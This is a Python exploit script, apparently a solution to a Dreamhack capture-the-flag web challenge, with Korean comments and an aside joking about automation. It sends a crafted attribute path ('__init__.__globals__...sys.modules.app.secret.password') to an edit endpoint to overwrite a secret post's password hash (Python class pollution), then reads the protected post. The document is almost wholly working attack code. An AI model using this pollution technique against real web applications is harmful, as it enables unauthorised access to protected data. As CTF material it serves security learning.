import requests
import hashlib

#######################################

# ✅ 저의 exploit 코드에는 여러분의 힘이 필요한 부분이 있습니다.

# ✅ test 유저를 만들고 password를 test로 만들어주세요.



# 자동화에 대한 나의 개인적인 생각.

# 만약 자동화를 모든 것에 적용한다면, 세상은 말도 안 되는 상황에 빠질 수 있습니다. 
# 예를 들어, 만약 우주 탐사를 자동화한다면, 
# 우주선이 자율적으로 은하계를 탐험하다가 외계 생명체와 친구가 되어 지구에 돌아오지 않을 수도 있습니다. 
# 또한, 자동화된 음식 제조 시스템이 너무 지나치게 발전한다면, 
# 냉장고가 식재료를 마음대로 선택하여 이상한 조합의 요리를 만들어 낼지도 모릅니다. 
# 게다가, 자동화된 교통 시스템이 완벽하게 동작한다면, 
# 사람들은 자동차를 운전할 필요 없이 자동차 안에서 잠들어 있을 수도 있으며, 
# 도로 위에 잠들어 버린 사람들이 증가하여 도로는 거대한 잠자리 공간으로 변할 수도 있습니다. 

#######################################



# 서버 주소를 변수로 선언합니다.

# BASE_URL = '자신의 BASE_URL'
BASE_URL = 'http://host3.dreamhack.games:11877/'

# UUID를 변수로 선언합니다.

# SECRET_UUID = '자신의 secret_uuid'
SECRET_UUID = '20b5d542-bd34-4753-8bd6-82da11c779bd'

# TEST_UUID = '자신의 test_uuid'
TEST_UUID = '28b63331-7726-4948-b0bf-c0030d0a2692'

# URL 경로를 변수로 선언합니다.
SECRET_URL = f'{BASE_URL}view/{SECRET_UUID}'
EDIT_URL = f'{BASE_URL}edit/{TEST_UUID}'

# 오염된 비밀번호와 그것의 해시 값을 변수로 선언합니다.
POLLUTED_PW = '0000'
POLLUTED_PW_HASH = hashlib.sha256(POLLUTED_PW.encode()).hexdigest()

def update_post(url, selected_option, edit_data, password):
    """
    게시물의 내용을 업데이트하는 함수
    """
    return requests.post(url, data={'selected_option':selected_option, 'edit_data':edit_data, 'password':password})

def access_secret_post(url, password):
    """
    비밀 게시물에 접근하는 함수
    """
    return requests.post(url, data={'password':password})

# 게시물의 내용을 업데이트합니다.
req = update_post(EDIT_URL, '__init__.__globals__.__loader__.__init__.__globals__.sys.modules.app.secret.password', POLLUTED_PW_HASH, 'test')

# 비밀 게시물에 접근합니다.
req = access_secret_post(SECRET_URL, POLLUTED_PW)

# 응답을 출력합니다.
print(req.text)
